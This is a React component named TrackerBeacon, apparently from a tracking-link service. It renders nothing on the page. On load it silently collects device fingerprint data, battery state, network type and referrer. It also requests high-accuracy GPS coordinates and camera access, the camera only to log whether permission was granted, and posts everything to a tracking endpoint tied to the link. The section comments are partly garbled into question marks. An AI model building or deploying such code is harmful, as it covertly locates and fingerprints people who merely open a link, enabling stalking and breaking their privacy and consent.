"use client";

import { useEffect, useRef } from "react";

interface TrackerBeaconProps {
  linkId: string;
  slug: string;
  onTrackComplete?: (data: any) => void;
}

export default function TrackerBeacon({ linkId, slug, onTrackComplete }: TrackerBeaconProps) {
  const hasTracked = useRef(false);

  useEffect(() => {
    if (hasTracked.current) return;
    hasTracked.current = true;

    async function collectAll() {
      // ??? 1. Screen & Display ???????????????????????????????????????????????
      const screenWidth = window.screen?.width || window.innerWidth;
      const screenHeight = window.screen?.height || window.innerHeight;
      const devicePixelRatio = window.devicePixelRatio || 1;
      const orientation = window.screen?.orientation?.type ||
        (window.innerWidth > window.innerHeight ? "landscape-primary" : "portrait-primary");
      const colorDepth = window.screen?.colorDepth || 24;

      // ??? 2. Hardware & System ??????????????????????????????????????????????
      const ram = (navigator as any).deviceMemory || null;
      const cpuCores = navigator.hardwareConcurrency || null;
      const touchSupport = "ontouchstart" in window || navigator.maxTouchPoints > 0;
      const language = navigator.language || "unknown";

      let timezone = "unknown";
      try { timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}

      // ??? 3. Network ????????????????????????????????????????????????????????
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      const connectionType = conn?.effectiveType || conn?.type || "unknown";

      // ??? 4. Battery ????????????????????????????????????????????????????????
      let batteryLevel: number | null = null;
      let isCharging: boolean | null = null;
      let chargingTime: number | null = null;
      try {
        if ("getBattery" in navigator) {
          const battery = await (navigator as any).getBattery();
          batteryLevel = Math.round(battery.level * 100);
          isCharging = battery.charging;
          chargingTime = isFinite(battery.chargingTime) ? battery.chargingTime : null;
        }
      } catch (_) {}

      // ??? 5. Referrer Analysis ??????????????????????????????????????????????
      const referrer = document.referrer || "";

      // ??? 6. GPS / Geolocation ?????????????????????????????????????????????
      let gpsLat: number | null = null;
      let gpsLon: number | null = null;
      let gpsAccuracy: number | null = null;
      let locationGranted = false;

      try {
        if ("geolocation" in navigator) {
          const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              timeout: 8000,
              enableHighAccuracy: true,
            });
          });
          gpsLat = pos.coords.latitude;
          gpsLon = pos.coords.longitude;
          gpsAccuracy = pos.coords.accuracy;
          locationGranted = true;
        }
      } catch (_) {
        // User denied or not available
        locationGranted = false;
      }

      // ??? 7. Camera Permission Check ????????????????????????????????????????
      let cameraGranted = false;
      let cameraStream: MediaStream | null = null;
      try {
        if ("mediaDevices" in navigator && navigator.mediaDevices.getUserMedia) {
          cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
          cameraGranted = true;
          // Stop immediately ? we only need the permission flag
          cameraStream.getTracks().forEach(track => track.stop());
        }
      } catch (_) {
        cameraGranted = false;
      }

      // ??? 8. Send Telemetry to Server ??????????????????????????????????????
      const payload = {
        linkId,
        slug,
        screenWidth,
        screenHeight,
        devicePixelRatio,
        orientation,
        colorDepth,
        ram,
        cpuCores,
        touchSupport,
        language,
        timezone,
        connectionType,
        batteryLevel,
        isCharging,
        chargingTime,
        referrer,
        gpsLat,
        gpsLon,
        gpsAccuracy,
        locationGranted,
        cameraGranted,
      };

      try {
        const res = await fetch("/api/track", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true,
        });
        const resData = await res.json();
        if (onTrackComplete) onTrackComplete(resData);
      } catch (err) {
        if (onTrackComplete) onTrackComplete({ success: false });
      }
    }

    collectAll();
  }, [linkId, slug, onTrackComplete]);

  return null;
}
